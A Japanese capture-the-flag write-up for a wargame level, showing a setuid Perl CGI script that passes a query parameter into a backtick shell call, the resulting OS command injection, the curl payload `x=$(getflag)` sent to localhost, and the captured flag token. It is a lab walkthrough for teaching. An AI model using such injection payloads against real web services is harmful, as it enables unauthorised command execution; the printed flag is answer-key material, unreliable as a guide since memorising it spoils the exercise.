# Level 04

## 目的
ユーザー `flag04` の権限で `getflag` コマンドを実行し、フラグを取得する。

## 手順と解説

### 1. 調査

`level04` ユーザーでログイン後、ホームディレクトリを確認します。

```bash
ls -l
```
出力:
```text
-rwsr-sr-x 1 flag04  level04  152 Mar  5  2016 level04.pl
```
SetUIDされたPerlスクリプト `level04.pl` が見つかります。

中身を確認します。
```perl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```

### 2. 脆弱性の特定

このスクリプトは、Webサーバー（ポート4747）上でCGIとして動作しているようです。
パラメータ `x` で受け取った文字列を `$y` に格納し、`echo $y` というシェルコマンドを実行しています（バッククォート `` ` `` によるコマンド実行）。

ここで、`$y` の中身が検証されずにそのまま `echo` コマンドの引数として渡されているため、**OSコマンドインジェクション**の脆弱性があります。

例えば `x=$(getflag)` という値を渡すと、Perlは以下のシェルコマンドを実行しようとします。
```bash
echo $(getflag) 2>&1
```
シェルは `$(getflag)` を展開して `getflag` コマンドを実行し、その結果を `echo` で表示します。

### 3. エクスプロイト（攻撃）

Webリクエストを通じて攻撃コードを送信します。`curl` コマンドを使用します。

```bash
curl "http://localhost:4747/?x=\$(getflag)"
```

*   `$(getflag)`: シェルによるコマンド置換です。Webサーバー側で実行される際、この部分が `getflag` コマンドの実行結果に置き換わります。

### 4. 結果

`curl` のレスポンスとしてフラグが含まれていました。

```text
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
```

## 結果

### トークン (Flag)
`ne2searoevaevoem4ov4ar8ap`

```